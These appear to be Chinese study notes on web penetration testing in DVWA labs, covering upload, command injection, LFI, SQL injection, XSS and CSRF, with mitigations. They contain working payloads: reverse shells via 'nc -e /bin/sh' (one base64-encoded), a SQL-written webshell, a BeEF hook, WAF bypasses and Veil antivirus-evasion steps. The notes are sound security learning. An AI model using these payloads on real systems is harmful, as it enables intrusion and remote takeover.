文件上传漏洞
  • 上传一个php shell 或后门，工具weevly
    • 生成后门：weevly generate [password][filename]
    • 上传生成的文件
    • 连接文件：weevly [url to file][password]
  • 用burpsuite抓包
  • 如果上传了一个包含木马的图片马，需要配合解析漏洞或文件包含漏洞才能正常执行，或者修改配置文件，apache的话是.htaccess文件。所有的手段都是为了让这个图片文件解析成php脚本文件。
  • 防止
    • 不允许用户上传额外类型的文件
    • 检查文件类型和文件扩展名
    • 分析上传的文件，重新生成并重命名
代码执行漏洞

  • 利用;作为命令的分隔符

  • 如果过滤了;、&&

    • 使用pipe，即|
      • 命令1 | 命令2：将命令1的输出作为命令2的输入，如果命令2不需要输入，则直接执行命令2
  • 防范(Mitigation)
    • 不要使用危险的函数
    • 在执行之前过滤输入
      • 比如DVWA中的代码执行
        1. 删除反斜杠
        2. 将用户输入按.分割，放入一个容量为4的一维数组中
        3. 判断数组中的四个值是否全为数字，可以使用is_numeric()函数
        4. 如果全为数字再执行ping命令
本地文件包含漏洞(LFI, Local File Inclusion)

  • 打开并包含本地文件的漏洞，通过代码注入，包含即执行

    • php中文件包含函数
      • require()、require_once、include()、include_once()
        • include和require区别主要是，include在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；而require函数出现错误的时候，会直接报错并退出程序的执行。
        • 而include_once()，require_once()这两个函数，与前两个的不同之处在于这两个函数只包含一次，适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题。

  • 危害

    • 允许攻击者读取同一服务器下的任意文件

    • 在目标之外接近文件——渗透了一个站，然后目标站和这个站是在同一个服务器上的，那么你就可以获取目标站的文件

  • /etc/passwd包含了重要信息

    • 如DVWA，删去?page=发现存在路径/var/www/dvwa/vulnerabilities/fi/include.php，我们的目标是/etc/passwd
    • 所以构造网址http://ip/dvwa/vulnerabilities/fi/?page=../../../../../etc/passwd
    • ..表示上一级目录，上述操作到达了我们指定的目录获取到passwd的信息
  • 获取shell——尝试写入恶意代码
    • 比如
      • /proc/self/environ
        • proc/self/environ中会保存user-agent头。
        • 如果在user-agent中插入php代码，则php代码会被写入到environ中，之后再包含它即可。
      • /var/log/auth.log
        • /var/log/auth.log中会记录所有尝试登陆此服务器的信息
        • 如果在尝试登陆的时候在用户名中插入php代码，则php代码会被写到auth.log中，之后再包含它即可。
      • /var/log/apche2/access.log
        • Apache日志文件，它包含指向HTTP服务器的所有请求
    • 方法一(/proc/self/environ)
      • 构造网址http://渗透机ip/dvwa/vulnerabilities/fi/?page=../../../../../proc/self/environ获取到系统环境信息。
      • 通过burpsuite抓包，修改User_agent，<?phpinfo();?>，forward以后代码被执行
      • 将代码改为<?passthru("nc -e /bin/sh 攻击机ip port");?>
      • 在kali中监听，连接成功后就可以远程执行命令
    • 方法二(/var/log/auth.log)
      • 构造网址http://渗透机ip/dvwa/vulnerabilities/fi/?page=../../../../../var/log/auth.log获取信息。
      • 进攻机上开始监听nc -vv -l -p 8900
      • 尝试连接ssh "<?passthru(base64_decode('bmMgLWUgL2Jpbi9zaCAxOTIuMTY4LjkyLjEzNSA4OTAw'));?>"@漏洞机ip
        • bmMgLWUgL2Jpbi9zaCAxOTIuMTY4LjkyLjEzNSA4OTAw是nc -e /bin/sh 192.168.92.135 8900经过base64编码的结果
        • 编码以后再用php中的函数解码
      • 密码随便输，这时已经保存到文件上了
      • 刷新第一步的网址，连接建立。
  • 防范：创建白名单
    • 使用静态的文件判断，只允许特定的网页显示，其他的提交都将报错

SQL注入漏洞
  • 验证能不能实现something' and 1=1，能实现就有注入
登录界面
  • 利用burpsuite抓包可以知道对于SQL语句的过滤是在客户端还是服务器端
    • 点击登录以后，连包都没抓到就被检测到了——过滤在客户端
      • 发送正常的数据，在burpsuite上抓到包以后修改然后进行SQL注入
  • 暂时性地防护：使用real_escape_string函数过滤用户输入，删除用户输入中的单引号。

先进的渗透
  • 盲注
    • 1' and 1=1 #、1' and 1=2 #——查看页面的变化
    • 1' order by 1#、1' order by 1000000#——查看页面变化
    • %23——#、%27——'——URL编码
    • 如果过滤了'，如果table_schema='something'无法通过，可以将something用hex编码(bp上的decoder可以直接编码)，原来的句子变为table_schema=0xHex编码，用0x开头。这样就不需要引号了。
  • 过WAF技巧
    • 大小写绕过
    • 使用+、/**/替代空格
    • //、/*、--——注释。有时要添加分号再注释。
    • limit 0,1从记录0开始，只展示一个记录。

    • 这时可以将修改路径，使代码保存到允许存放的路径
SQL+LFI–>获取Shell
  • 如果服务器有本地文件包含漏洞和SQL注入漏洞，那么可以将两者结合起来，获取Reverse Shell(目标计算机发送连接请求到进攻机)
  • 当找到SQL注入写入恶意代码以后，不用在用一个网站上寻找本地文件包含漏洞，而是在这个服务器上的任意一个网站上有本地包含漏洞就行
    • union select '<?php passthru("nc -e /bin/sh 进攻机ip 8080");?>',null into outfile '指定的绝对路径/reverse.php'
    • 如果执行后显示文件已经存在，其实是写入成功
    • 在包含本地文件包含漏洞的地方访问这个文件，导致执行，得到Shell
工具

高级防护

  • 预编译，提前写好查询语句

  • 用户的输入作为整个字符串的查询值，而不是代码，不会在输入中产生执行语句

    • 如果用户输入admin' union select #，查询语句变为select * from user where id ="'admin' union select #'"，传入的值作为一个完整的值进行查询，所以无法注入

XSS漏洞

  • 代码只是在客户端上执行，不是在服务器端

  • 分类

    • 存储型/持久型XSS——危害更大，只要用户访问就会执行
      • 存储进网页或DB
      • 每次加载网页的时候就会执行插入的脚本
    • 反射型XSS——发给用户具有xss的漏洞的链接，用户访问时便会在他们的电脑上执行脚本
      • 访问弹窗
    • 基于DOM的XSS

  • 发现XSS

    • http://target.com/page.php?something=something

  • 前端的字符长度的限制可以直接查看源码修改

  • 不用引号的XSS

    • <SCript>alert(String.fromCharCode(88,83,83))</scRipt>
      • CharCode可以在线查询，这种方法不需要引号

  • 利用XSS漏洞

    • 使用beef framework，<script src="http://进攻机ip：3000/hook.js"><script>，这样就能挂到beef上

    • 工具——BEEF

      • Commands
        • alert：在挂钩的主机浏览器上弹窗
        • raw：在挂钩的主机上执行js代码
        • spy：获取挂钩的主机当前界面，监视，但是只能看到这个具有XSS漏洞的页面
        • redirect：使这个具有XSS漏洞的界面跳转到指定页面
        • social engineering
          • pretty theft：可以获取用户的facebook、youtube等信息。

    • 工具——veil(一个框架，用于生成无法被检测到的后门)

      • 后门：本质是一个文件，当它被执行的时候将会使我们对服务器拥有控制权限
      • 后门会被Anti-virus项目检测到，veil就是为了避开这种检测而产生的
      • 生成后门
        • use 1：使用Veil-Evasion
        • 选择想要使用的payload
        • options：查看配置选项
        • set Something something：设置选项参数，端口一般就设为80或8080
        • set PROCESSOR 1——不一定，可以自己设置，为的就是避过检测
        • ser SLEEP 6——为了避过检测
        • generate：生成payloads
        • 设置生成的文件的名字（不用写后缀）
      • https://nodistribute.com/可以上传生成的exe文件，检测是否被查出有后门
      • 使用msf连接上述指定的端口
        • msfconsole
        • use exploit/multi/handler：指定使用的模块
        • show options
        • set PAYLOAD something：指定正确的payload
        • 设置其他选项，如ip、port等
        • exploit：开始监听，准备建立连接
      • 将后门文件传送给目标电脑

  • 防范

    • 最大程度限制用户输入的利用范围
    • 转义用户的输入，利用htmlspecialchars()函数，转化为html实体
不安全的Session管理
  • CSRF(跨站请求伪造)
  • 如修改密码：
    • 找到网页的form 部分，设置action的目的地
    • 将表单的输入框和提交按钮的type全部设为hidden
    • 输入框设置value，使用js自动提交表单
      • 为form设置id
      • <script>document.getElementById('xxx').submit();</script>
    • 将html文件上传到服务器上，别人访问链接的时候就会自动提交表单
  • 防范
    • 设置当前密码的输入框，再修改密码
    • 不用要求用户再次输入用户信息的方法
      • 使用同步的(synchronizing)tokens
        • 用户访问一个页面，服务器返回html页面，还包含一个独特的token
        • 用户提交表单的时候，服务器只会接受返回相同token的请求
    • 关于动态同步tokens
      • 不可被预测而且不能再次使用
        • token必须是一个很大的值
        • 必须随机且特殊
        • 在token的生成算法中可以包含其他元素，比如当前时间、日期等
      • 以隐藏的表单的形式将token嵌入到页面中
      • 当表单被提交时验证token
